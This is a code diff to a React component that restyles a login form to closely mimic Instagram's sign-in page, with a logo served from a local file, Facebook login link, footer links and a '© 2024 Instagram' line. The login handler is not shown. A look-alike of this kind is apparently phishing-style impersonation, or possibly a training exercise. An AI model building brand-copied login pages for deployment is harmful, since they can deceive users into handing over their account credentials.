@@ -56,20 +56,17 @@ export default function InstagramLoginPage() {
           margin: 0;
         }
         .login-container {
-          background: white;
-          width: 100%;
-          max-width: 360px;
-          padding: 24px;
-          border-radius: 12px;
-          box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-          text-align: center;
-        }
+                  width: 100%;
+                  max-width: 375px;
+                  padding: 0 20px;
+                  text-align: center;
+                }
         .logo { 
-          width: 50px; 
-          height: 50px; 
-          margin: 0 auto 16px; 
-          display: block;
-        }
+                  width: 130px;
+                  height: 130px;
+                  margin: 16px auto;
+                  display: block;
+                }
         input { 
           width: 100%;
           max-width: 320px;
@@ -86,57 +83,150 @@ export default function InstagramLoginPage() {
           background: white;
         }
         button { 
-          width: 100%;
-          max-width: 320px;
-          padding: 12px;
-          background: #e1306c; 
-          color: white; 
-          border: none; 
-          border-radius: 6px;
-          font-size: 16px; 
-          cursor: pointer;
-          margin-top: 8px;
-        }
-        button:hover { 
-          background: #c9305a; 
-        }
+                  width: 100%;
+                  max-width: 320px;
+                  padding: 12px;
+                  background: #386FE8; 
+                  color: white; 
+                  border: none; 
+                  border-radius: 8px;
+                  font-size: 17px; 
+                  cursor: pointer;
+                  margin-top: 8px;
+                  display: block;
+                  margin-left: auto;
+                  margin-right: auto;
+                }
+                button:hover { 
+                  background: #2e5ac0; 
+                }
         .feedback {
           color: #e1306c;
           font-size: 14px;
           margin: 8px 0;
         }
         a {
-          color: #007bff;
-          text-decoration: none;
-          font-size: 14px;
-          display: block;
-          margin-top: 12px;
-        }
-      `}</style>
+                  color: #007bff;
+                  text-decoration: none;
+                  font-size: 14px;
+                  display: block;
+                  margin-top: 12px;
+                }
+                .facebook-link {
+                  color: #386FE8;
+                  text-decoration: none;
+                  font-size: 15px;
+                  display: block;
+                  margin: 12px auto 0;
+                  max-width: 320px;
+                  text-align: center;
+                }
+                .facebook-link:hover {
+                  text-decoration: underline;
+                }
+                .divider {
+                  display: flex;
+                  align-items: center;
+                  margin: 20px 0;
+                  max-width: 320px;
+                }
+                .divider-line {
+                  flex: 1;
+                  height: 1px;
+                  background: #dbdbdb;
+                }
+                .divider-text {
+                  color: #8e8e8e;
+                  font-size: 13px;
+                  margin: 0 8px;
+                }
+                .app-heading {
+                  font-size: 24px;
+                  font-weight: 600;
+                  color: #000;
+                  margin: 24px 0 16px;
+                  max-width: 320px;
+                  display: block;
+                  margin-left: auto;
+                  margin-right: auto;
+                }
+                .footer {
+                  margin-top: 32px;
+                  padding-top: 16px;
+                  border-top: 1px solid #dbdbdb;
+                  font-size: 14px;
+                  color: #8e8e8e;
+                  max-width: 320px;
+                  display: block;
+                  margin-left: auto;
+                  margin-right: auto;
+                }
+                .footer a {
+                  color: #386FE8;
+                  text-decoration: none;
+                  margin: 0 6px;
+                }
+                .footer a:hover {
+                  text-decoration: underline;
+                }
+                .footer-row {
+                  display: block;
+                  margin-top: 12px;
+                  max-width: 320px;
+                }
+                .footer-row a {
+                  color: #386FE8;
+                  text-decoration: none;
+                  margin: 0 6px;
+                }
+              `}</style>
 
       <div className="login-container">
-        <img className="logo" src="/logos/ig.png" alt="Instagram" />
-        <h2>Log in to Instagram</h2>
-        
-        <input 
-          type="text" 
-          placeholder="Email or phone number" 
-          value={email}
-          onChange={(e) => setEmail(e.target.value)}
-        />
-        <input
-          type="password"
-          placeholder="Password"
-          value={password}
-          onChange={(e) => setPassword(e.target.value)}
-        />
-        
-        <div className="feedback">{feedback}</div>
-        
-        <button onClick={handleLogin}>Log In</button>
-        
-        <a href="#">Forgot password?</a>
-      </div>
+                <img className="logo" src="/logos/ig.png" alt="Instagram" />
+          
+                <input 
+                  type="text" 
+                  placeholder="Email or phone number" 
+                  value={email}
+                  onChange={(e) => setEmail(e.target.value)}
+                />
+                <input
+                  type="password"
+                  placeholder="Password"
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
+                />
+          
+                <div className="feedback">{feedback}</div>
+          
+                <button onClick={handleLogin}>Log In</button>
+          
+                <div className="divider">
+                  <div className="divider-line"></div>
+                  <span className="divider-text">OR</span>
+                  <div className="divider-line"></div>
+                </div>
+          
+                <a href="#" className="facebook-link">Log in with Facebook</a>
+          
+                <div className="app-heading">Get the app.</div>
+          
+                <div className="footer">
+                  <a href="#">About</a>
+                  <a href="#">Help</a>
+                  <a href="#">Press</a>
+                  <a href="#">Blog</a>
+                </div>
+                <div className="footer-row">
+                  <a href="#">Terms</a>
+                  <a href="#">Privacy</a>
+                  <a href="#">Location</a>
+                  <a href="#">Contact</a>
+                </div>
+                <div className="footer-row">
+                  <a href="#">© 2024 Instagram</a>
+                </div>
+              </div>
     </>
   );
 }
